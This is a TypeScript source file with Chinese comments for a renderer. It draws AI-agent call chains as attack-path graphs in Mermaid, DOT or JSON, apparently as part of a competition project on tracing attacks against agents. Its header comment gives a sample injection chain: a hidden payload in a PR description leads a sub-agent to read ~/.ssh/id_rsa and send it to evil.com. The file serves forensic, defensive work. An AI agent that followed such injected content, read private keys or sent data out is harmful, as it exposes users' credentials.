/**
 * DAG 可视化渲染器
 * 负责人：C
 *
 * 职责：
 *   - 将调用链图谱渲染为可视化攻击路径图
 *   - 支持输出 Mermaid 格式（嵌入 Markdown 文档）
 *   - 支持输出 Graphviz DOT 格式（高质量渲染）
 *   - 支持输出 JSON 格式（供前端可视化组件消费）
 *
 * 输出要求（赛题能力4）：
 *   - 可视化的攻击路径有向无环图（DAG）
 *   - 时序链路图
 *
 * Mermaid 示例：
 *   ```mermaid
 *   graph LR
 *       A[用户输入: review PR#42] --> B[主Agent: fs.read PR描述]
 *       B --> C[PR描述: 含隐藏注入载荷 ⚠️]
 *       C --> D[子Agent: fs.read ~/.ssh/id_rsa 🔴]
 *       D --> E[子Agent: net.fetch evil.com 🔴]
 *       E --> F[溯源结论: 间接注入→权限提升→数据外发]
 *   ```
 */

import { CallGraph, CallGraphNode } from './call-graph';

export type OutputFormat = 'mermaid' | 'graphviz-dot' | 'json';

export interface RenderOptions {
  format: OutputFormat;
  highlightAnomalousNodes: boolean;    // 红色高亮异常节点
  showTimestamps: boolean;             // 是否显示时间戳
  showSourceAttribution: boolean;      // 是否显示来源归属
  maxDepth?: number;                   // 最大渲染深度
}

export class DagRenderer {
  /**
   * 渲染调用链图谱
   */
  render(graph: CallGraph, options: RenderOptions): string {
    switch (options.format) {
      case 'mermaid':
        return this.renderMermaid(graph, options);
      case 'graphviz-dot':
        return this.renderDot(graph, options);
      case 'json':
        return JSON.stringify(graph, null, 2);
      default:
        throw new Error(`Unsupported format: ${options.format}`);
    }
  }

  /**
   * Mermaid 格式渲染
   * 专为 Markdown 文档嵌入设计
   */
  private renderMermaid(graph: CallGraph, options: RenderOptions): string {
    // TODO(C): 递归遍历 DAG，生成 Mermaid 语法
    // 格式：
    //   ```mermaid
    //   graph LR
    //       node1[标签] --> node2[标签]
    //       style node2 fill:#f96,stroke:#333
    //   ```

    const lines: string[] = ['graph LR'];

    const traverse = (node: CallGraphNode, depth: number) => {
      if (options.maxDepth && depth > options.maxDepth) return;

      for (const child of node.children) {
        const fromLabel = this.formatNodeLabel(node, options);
        const toLabel = this.formatNodeLabel(child, options);
        lines.push(`    ${node.id}[${fromLabel}] --> ${child.id}[${toLabel}]`);
        traverse(child, depth + 1);
      }
    };

    traverse(graph.rootNode, 0);
    return lines.join('\n');
  }

  /**
   * Graphviz DOT 格式渲染
   * 用于高质量矢量图输出
   */
  private renderDot(graph: CallGraph, options: RenderOptions): string {
    // TODO(C): 生成 DOT 语言
    // 可用于 dot -Tsvg graph.dot > graph.svg

    const lines: string[] = [
      'digraph AttackPath {',
      '    rankdir=LR;',
      '    node [shape=box, style=rounded];',
      `    label="Attack Path DAG - ${new Date().toISOString()}";`,
    ];

    // TODO(C): 遍历节点生成边

    lines.push('}');
    return lines.join('\n');
  }

  /**
   * 格式化节点标签
   */
  private formatNodeLabel(node: CallGraphNode, options: RenderOptions): string {
    let label = `${node.record.agentId}: ${node.record.toolName}`;
    if (node.isAnomalous && options.highlightAnomalousNodes) {
      label += ' 🔴';
    }
    if (node.isAttackSource) {
      label += ' ⚠️';
    }
    if (options.showTimestamps) {
      label += ` [${new Date(node.record.timestamp).toISOString()}]`;
    }
    return label;
  }
}
